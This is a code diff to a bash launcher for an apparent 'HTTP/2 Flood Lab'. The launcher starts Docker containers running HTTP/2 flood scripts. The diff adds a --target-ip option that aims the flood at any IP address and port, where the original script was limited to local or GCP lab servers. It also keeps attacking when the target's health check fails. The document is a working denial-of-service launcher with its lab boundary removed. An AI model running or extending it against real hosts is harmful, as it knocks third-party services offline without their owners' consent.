@@ -32,11 +32,12 @@ fi
 usage() {
     echo "HTTP/2 Flood Lab - Attack-Only Deployment"
     echo ""
-    echo "Usage: $0 --local|--gcp <part-A|part-B|--stop> [options]"
+    echo "Usage: $0 --local|--gcp|--target-ip <IP> <part-A|part-B|--stop> [options]"
     echo ""
     echo "Targets:"
     echo "  --local             Attack local victim server"
     echo "  --gcp               Attack GCP victim server from local machine"
+    echo "  --target-ip <IP[:PORT]> Attack specific IP address (default port: 8080)"
     echo ""
     echo "Commands:"
     echo "  part-A              Attack single-worker victim server"
@@ -51,32 +52,14 @@ usage() {
     echo "Examples:"
     echo "  $0 --local part-A                    # Attack local part-A server"
     echo "  $0 --gcp part-A                      # Attack GCP part-A server from local"
+    echo "  $0 --target-ip 192.168.1.100 part-A     # Attack specific IP (port 8080)
+  $0 --target-ip 192.168.1.100:3000 part-A # Attack specific IP:port"
     echo "  CONNECTIONS=16 $0 --local part-B     # Custom connection count"
     echo "  ATTACK=advanced $0 --gcp part-B      # Advanced attack against GCP"
     echo "  $0 --local --stop                    # Stop local attacks"
     echo ""
     exit 1
 }
-
-dc() {
-  # Prefer Compose v2 (probe with sudo first, then without)
-  if sudo -n docker compose version >/dev/null 2>&1; then
-    sudo docker compose "$@"
-  elif docker compose version >/dev/null 2>&1; then
-    docker compose "$@"
-  # Fallback to legacy v1 (probe with sudo, then without)
-  elif sudo -n docker-compose version >/dev/null 2>&1; then
-    sudo docker-compose "$@"
-  elif command -v docker-compose >/dev/null 2>&1; then
-    docker-compose "$@"
-  else
-    echo "ERROR: Docker Compose not installed (neither 'docker compose' nor 'docker-compose')." >&2
-    exit 1
-  fi
-}
-
-
-
 
 # HTTP/2 server health check function
 check_http2_server() {
@@ -127,13 +110,22 @@ done
 # Restore positional arguments
 set -- "${POSITIONAL_ARGS[@]}"
 
-# Check arguments
+# Check arguments and handle --target-ip option
 if [ $# -lt 2 ]; then
     usage
 fi
 
 TARGET=$1
-COMMAND=$2
+if [ "$TARGET" = "--target-ip" ]; then
+    if [ $# -lt 3 ]; then
+        print_error "Missing IP address for --target-ip option"
+        usage
+    fi
+    CUSTOM_TARGET_IP=$2
+    COMMAND=$3
+else
+    COMMAND=$2
+fi
 ATTACK=${ATTACK:-basic}
 STREAMS=${STREAMS:-256}
 
@@ -147,7 +139,7 @@ if [ -z "$CONNECTIONS" ]; then
 fi
 
 # Validate target
-if [[ "$TARGET" != "--local" && "$TARGET" != "--gcp" ]]; then
+if [[ "$TARGET" != "--local" && "$TARGET" != "--gcp" && "$TARGET" != "--target-ip" ]]; then
     print_error "Invalid target: $TARGET"
     usage
 fi
@@ -160,7 +152,7 @@ if [ "$TARGET" = "--local" ]; then
     if [ "$COMMAND" = "--stop" ]; then
         print_info "Stopping local attacks..."
         cd attacks
-        dc down 2>/dev/null || true
+        docker-compose down 2>/dev/null || true
         cd ..
         print_success "Local attacks stopped successfully!"
         exit 0
@@ -199,11 +191,11 @@ if [ "$TARGET" = "--local" ]; then
     
     # Stop any existing attacks
     cd attacks
-    dc down 2>/dev/null || true
-
+    docker-compose down 2>/dev/null || true
+    
     # Launch attack
     print_info "Building and starting attack container..."
-    if dc up -d --build; then
+    if docker-compose up -d --build; then
         print_success "Local attack launched successfully!"
         echo
         echo "=================================================="
@@ -234,7 +226,7 @@ elif [ "$TARGET" = "--gcp" ]; then
     if [ "$COMMAND" = "--stop" ]; then
         print_info "Stopping GCP attacks..."
         cd attacks
-        dc down 2>/dev/null || true
+        docker-compose down 2>/dev/null || true
         cd ..
         print_success "GCP attacks stopped successfully!"
         exit 0
@@ -314,11 +306,11 @@ elif [ "$TARGET" = "--gcp" ]; then
     
     # Stop any existing attacks
     cd attacks
-    dc down 2>/dev/null || true
-
+    docker-compose down 2>/dev/null || true
+    
     # Launch attack
     print_info "Building and starting attack container..."
-    if dc up -d --build; then
+    if docker-compose up -d --build; then
         print_success "GCP attack launched successfully!"
         echo ""
         print_success "Attacking GCP server at: $TARGET_URL"
@@ -334,6 +326,98 @@ elif [ "$TARGET" = "--gcp" ]; then
         echo ""
     else
         print_error "GCP attack launch failed!"
+        exit 1
+    fi
+
+#
+# CUSTOM TARGET IP ATTACKS (against any IP address)
+#
+elif [ "$TARGET" = "--target-ip" ]; then
+    # Handle --stop command
+    if [ "$COMMAND" = "--stop" ]; then
+        print_info "Stopping custom target attacks..."
+        cd attacks
+        docker-compose down 2>/dev/null || true
+        cd ..
+        print_success "Custom target attacks stopped successfully!"
+        exit 0
+    fi
+    
+    # Validate command
+    if [[ "$COMMAND" != "part-A" && "$COMMAND" != "part-B" ]]; then
+        print_error "Invalid command: $COMMAND"
+        usage
+    fi
+    
+    # Parse IP and port from CUSTOM_TARGET_IP (format: ip or ip:port)
+    if [[ $CUSTOM_TARGET_IP =~ ^([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}):([0-9]+)$ ]]; then
+        # IP:PORT format
+        TARGET_IP="${BASH_REMATCH[1]}"
+        TARGET_PORT="${BASH_REMATCH[2]}"
+    elif [[ $CUSTOM_TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+        # IP only format, use default port
+        TARGET_IP="$CUSTOM_TARGET_IP"
+        TARGET_PORT="8080"
+    else
+        print_error "Invalid IP address format: $CUSTOM_TARGET_IP"
+        print_error "Expected format: xxx.xxx.xxx.xxx or xxx.xxx.xxx.xxx:port"
+        exit 1
+    fi
+    
+    # Validate port range
+    if [ "$TARGET_PORT" -lt 1 ] || [ "$TARGET_PORT" -gt 65535 ]; then
+        print_error "Invalid port number: $TARGET_PORT (must be 1-65535)"
+        exit 1
+    fi
+    
+    TARGET_URL="http://$TARGET_IP:$TARGET_PORT"
+    
+    # Check if target server is running
+    if ! check_http2_server "$TARGET_URL"; then
+        print_warning "Target server health check failed, but proceeding with attack..."
+        print_info "Make sure the target server at $TARGET_IP:$TARGET_PORT is running"
+    fi
+    
+    print_info "Launching HTTP/2 Flood Attack - $COMMAND (LOCAL → $TARGET_IP:$TARGET_PORT)"
+    print_info "Target: $TARGET_URL"
+    print_info "Attack: $CONNECTIONS TCP connections, $STREAMS streams each"
+    
+    # Set attack script based on type  
+    if [ "$ATTACK" = "advanced" ]; then
+        export ATTACK_SCRIPT="python cloud_http2_flood.py"
+    else
+        export ATTACK_SCRIPT="python http2_flood.py"
+    fi
+    
+    print_info "Attack script: $ATTACK_SCRIPT"
+    
+    # Set environment variables
+    export TARGET_URL
+    export CONNECTIONS
+    export STREAMS
+    
+    # Stop any existing attacks
+    cd attacks
+    docker-compose down 2>/dev/null || true
+    
+    # Launch attack
+    print_info "Building and starting attack container..."
+    if docker-compose up -d --build; then
+        print_success "Custom target attack launched successfully!"
+        echo ""
+        print_success "Attacking server at: $TARGET_URL"
+        echo ""
+        echo "=================================================="
+        print_info "Attack Monitoring Commands:"
+        echo "  docker logs -f http2-attacker"
+        echo "  docker stats --no-stream http2-attacker"
+        echo "  curl --http2-prior-knowledge -w \"Time: %{time_total}s\n\" $TARGET_URL"
+        echo "=================================================="
+        echo ""
+        print_info "To stop the attack: bash deploy-attack.sh --target-ip $CUSTOM_TARGET_IP --stop"
+        echo ""
+    else
+        print_error "Custom target attack launch failed!"
         exit 1
     fi
 
